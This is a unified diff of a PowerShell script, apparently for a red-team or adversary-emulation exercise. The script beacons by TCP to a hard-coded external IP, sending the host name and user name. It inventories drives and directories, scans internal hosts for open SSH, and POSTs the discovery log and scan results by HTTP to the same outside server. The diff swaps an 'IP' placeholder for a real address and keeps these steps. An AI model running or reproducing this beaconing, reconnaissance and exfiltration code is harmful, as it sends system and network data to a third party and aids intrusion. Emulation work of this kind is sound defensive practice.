@@ -1,7 +1,50 @@
-$ErrorActionPreference = "SilentlyContinue"
+$ErrorActionPreference = "Continue"
 
-$srv = "IP"
-$beaconPort = 7777
+function Write-ExerciseLog {
+    param([string]$Message)
+
+    $entry = "{0} | {1}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $Message
+    Add-Content -Path $logFile -Value $entry
+}
+
+function Test-MemoryVolumes {
+    $volumes = Get-CimInstance Win32_LogicalDisk |
+        Select-Object DeviceID, DriveType, Size, FreeSpace
+
+    Write-ExerciseLog "Volume inventory completed. Count: $($volumes.Count)"
+}
+
+function Test-MicrosoftDirectory {
+    $paths = @(
+        "$env:ProgramFiles\Microsoft",
+        "${env:ProgramFiles(x86)}\Microsoft",
+        "$env:APPDATA\Microsoft"
+    )
+
+    foreach ($path in $paths) {
+        if (Test-Path -LiteralPath $path) {
+            Write-ExerciseLog "Microsoft directory exists: $path"
+        }
+        else {
+            Write-ExerciseLog "Microsoft directory not found: $path"
+        }
+    }
+}
+
+function Test-TemporaryDirectory {
+    $tempPath = $env:TEMP
+
+    if (Test-Path -LiteralPath $tempPath) {
+        $count = @(
+            Get-ChildItem -LiteralPath $tempPath -Force -ErrorAction SilentlyContinue
+        ).Count
+
+        Write-ExerciseLog "Temporary directory checked. Item count: $count"
+    }
+}
+
+$srv = "4.182.66.115"
+$bcnprt = 7777
 $httpPort = 8080
 
 $root = "C:\Temp"
@@ -17,18 +60,18 @@ $marker = "$root\s1.txt"
     Out-File $marker -Encoding UTF8
 
 $startTime = Get-Date
-$endTime = $startTime.AddHours(1)
+$endTime = $startTime.AddMinutes(2)
 
 while ((Get-Date) -lt $endTime) {
 
     try {
 
         $client = New-Object System.Net.Sockets.TCPClient
-        $client.Connect($srv, $beaconPort)
+        $client.Connect($srv, $bcnprt)
 
         $stream = $client.GetStream()
 
-        $message = "BEACON|HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
+        $message = "HOST=$env:COMPUTERNAME|USER=$env:USERNAME|TIME=$(Get-Date)"
         $bytes = [System.Text.Encoding]::ASCII.GetBytes($message)
 
         $stream.Write($bytes, 0, $bytes.Length)
@@ -44,7 +87,7 @@ while ((Get-Date) -lt $endTime) {
         break
     }
 
-    $sleepSeconds = [Math]::Min(300, [Math]::Ceiling($remaining.TotalSeconds))
+    $sleepSeconds = [Math]::Min(60, [Math]::Ceiling($remaining.TotalSeconds))
 
     Start-Sleep -Seconds $sleepSeconds
 }
@@ -89,7 +132,6 @@ Get-ChildItem `
 
 
 try {
-
     $body = Get-Content $discoveryLog -Raw
 
     Invoke-WebRequest `
@@ -97,9 +139,11 @@ try {
         -Method POST `
         -Body $body `
         -ContentType "text/plain" `
-        -ErrorAction Stop
+        -UseBasicParsing `
 }
-catch {}
+catch {
+    Write-Host "Chyba: $($_.Exception.Message)"
+}
 
 $scanResult = "$resultFolder\scan.txt"
 
@@ -109,58 +153,55 @@ $scanResult = "$resultFolder\scan.txt"
 "Timestamp: $(Get-Date)" |
     Add-Content $scanResult
 
-"Target: IP/range" |
-    Add-Content $scanResult
-
 "Port: 22" |
     Add-Content $scanResult
 
 "" |
     Add-Content $scanResult
 
+$ips = @(
+    "192.168.0.1",
+    "192.168.0.2"
+)
 
-1..2 | ForEach-Object {
-
-    $ip = "IP.$_"
+foreach ($ip in $ips) {
+    $client = New-Object System.Net.Sockets.TcpClient
 
     try {
+        $async = $client.BeginConnect($ip, 22, $null, $null)
+        $connected = $async.AsyncWaitHandle.WaitOne(1500, $false)
 
-        $result = Test-NetConnection `
-            -ComputerName $ip `
-            -Port 22 `
-            -InformationLevel Quiet `
-            -WarningAction SilentlyContinue
-
-        if ($result) {
-
-            "$ip`:22 OPEN" |
-                Add-Content $scanResult
+        if ($connected -and $client.Connected) {
+            "$ip`:22 OPEN" | Add-Content $scanResult
         }
         else {
+            "$ip`:22 CLOSED/UNREACHABLE" | Add-Content $scanResult
+        }
 
-            "$ip`:22 CLOSED/UNREACHABLE" |
-                Add-Content $scanResult
+        if ($connected) {
+            $client.EndConnect($async)
         }
     }
     catch {
-
-        "$ip`:22 ERROR" |
-            Add-Content $scanResult
+        "$ip`:22 CLOSED/UNREACHABLE" | Add-Content $scanResult
+    }
+    finally {
+        $client.Close()
     }
 
     Start-Sleep -Milliseconds 250
 }
 
-
 try {
-
-    $scanBody = Get-Content $scanResult -Raw
+    $body = Get-Content $scanResult -Raw
 
     Invoke-WebRequest `
         -Uri "http://${srv}:${httpPort}" `
         -Method POST `
-        -Body $scanBody `
+        -Body $body `
         -ContentType "text/plain" `
-        -ErrorAction Stop
+        -UseBasicParsing `
 }
-catch {}
+catch {
+    Write-Host "Chyba: $($_.Exception.Message)"
+}
